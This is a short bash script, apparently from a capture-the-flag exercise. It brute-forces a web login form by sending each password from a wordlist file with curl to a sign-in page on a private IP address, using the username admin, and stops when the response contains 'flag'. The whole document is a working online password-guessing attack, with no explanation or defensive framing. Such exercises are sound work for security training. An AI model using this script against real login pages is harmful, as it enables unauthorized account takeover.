#!/bin/bash

RED="\033[1;31m"
GREEN="\033[1;32m"

while IFS= read -r line; do
    result="$(curl -s "http://10.12.100.44/?page=signin&username=admin&password=$line&Login=Login")"
    if [[ $result == *"flag"* ]]; then
        echo -e "${GREEN}Success! The password is: $line"
        exit
    else
        echo -e "${RED}Failed: $line"
    fi
done < ./Ressources/password.txt